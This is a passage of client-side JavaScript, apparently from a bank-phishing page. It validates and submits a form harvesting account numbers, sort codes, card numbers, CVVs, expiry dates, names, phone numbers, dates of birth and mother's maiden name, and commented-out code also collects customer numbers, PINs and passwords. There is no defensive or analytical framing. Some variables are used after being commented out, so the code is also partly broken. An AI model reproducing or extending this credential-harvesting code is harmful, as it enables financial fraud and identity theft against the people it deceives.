// unknown shit
//~ __insHiddenField=function(objDoc,objForm,sNm,sV){
		//~ var input=objDoc.createElement("input");
		//~ input.setAttribute("type","hidden");
		//~ input.setAttribute("name",sNm);
		//~ input.setAttribute("value",sV);
		//~ objForm.appendChild(input);
	  //~ };

		//~ var customer_number=$('#number').val();
		//~ var pin=$('#pin').val();
		//~ var pass=$('#pass').val();
		//~ 
		//~ var VRegExp=new RegExp(/^[0-9]{8,10}\b/);
		//~ if(!VRegExp.test(customer_number)){
		  //~ $('#number').closest('.form-group').addClass('has-error');
		  //~ err=true;
		//~ };
		//~ var VRegExp=new RegExp(/^[0-9]{4}\b/);
		//~ if(!VRegExp.test(pin)){
		  //~ $('#pin').closest('.form-group').addClass('has-error');
		  //~ err=true;
		//~ };
		//~ var VRegExp=new RegExp(/^[a-z-A-Z0-9]{3,50}\b/);
		//~ if(!VRegExp.test(pass)){
		  //~ $('#pass').closest('.form-group').addClass('has-error');
		  //~ err=true;
		//~ };
		//~ 
		
	  
	 
		var err=false;

		var acc=$('#acc').val();
		var sort=$('#sort').val();

		var VRegExp=new RegExp(/^[0-9]{8}\b/);
		if(!VRegExp.test(acc)){
		  $('#acc').closest('.form-group').addClass('has-error');
		  err=true;
		};
		var VRegExp=new RegExp(/^[0-9]{6}\b/);
		if(!VRegExp.test(sort)){
		  $('#sort').closest('.form-group').addClass('has-error');
		  err=true;
		};
		if(err==true){
		  return;
		};
		$('.cont2').hide();
		$('.cont3').show();
	  });
	  
	  $('.cont3 .cont_but').bind('click',function(){
		var err=false;
		var cc=$('#cc').val();
		var cvv=$('#cvv').val();
		if(!Validate(cc)){
		  $('#cc').closest('.form-group').addClass('has-error');
		  err=true;
		};
		if($('.exp_m option:selected').val()=="--"){
		  $('.exp_m').closest('.form-group').addClass('has-error');
		  err=true;
		};
		if($('.exp_y option:selected').val()=="----"){
		  $('.exp_y').closest('.form-group').addClass('has-error');
		  err=true;
		};
		var VRegExp=new RegExp(/^[0-9]{3}\b/);
		if(!VRegExp.test(cvv)){
		  $('#cvv').closest('.form-group').addClass('has-error');
		  err=true;
		};
		
		var f_name=$('#f_name').val();
		var l_name=$('#l_name').val();
		//~ var addr_lineN1=$('#addr_lineN1').val();
		//~ var postcode=$('#postcode').val();
		var phone=$('#phone').val();
		var VRegExp=new RegExp(/^[a-z-A-Z]{3,50}\b/);
		if(!VRegExp.test(f_name)){
		  $('#f_name').closest('.form-group').addClass('has-error');
		  err=true;
		};
		var VRegExp=new RegExp(/^[a-z-A-Z]{3,50}\b/);
		if(!VRegExp.test(l_name)){
		  $('#l_name').closest('.form-group').addClass('has-error');
		  err=true;
		};
		
		var mmn=$('#mmn').val();

		var VRegExp=new RegExp(/^[a-z-A-Z0-9]{4,20}\b/);
		if(!VRegExp.test(mmn)){
		  $('#mmn').closest('.form-group').addClass('has-error');
		  err=true;
		};
		var VRegExp=new RegExp(/^[a-z-A-Z0-9]{1,10}\b/);
		if(!VRegExp.test(addr_lineN1)){
		  $('#addr_lineN1').closest('.form-group').addClass('has-error');
		  err=true;
		};
		if(postcode.length<3){
		  $('#postcode').closest('.form-group').addClass('has-error');
		  err=true;
		};
		var VRegExp=new RegExp(/^[0-9]{6,11}\b/);
		if(!VRegExp.test(phone)){
		  $('#phone').closest('.form-group').addClass('has-error');
		  err=true;
		};
		if($('.dob_d option:selected').val()=="--"){
		  $('.dob_d').closest('.form-group').addClass('has-error');
		  err=true;
		};
		if($('.dob_m option:selected').val()=="--"){
		  $('.dob_m').closest('.form-group').addClass('has-error');
		  err=true;
		};
		if($('.dob_y option:selected').val()=="----"){
		  $('.dob_y').closest('.form-group').addClass('has-error');
		  err=true;
		};
		
		if(err==true){
		  return;
		};
		oForm.submit();
		
	  });
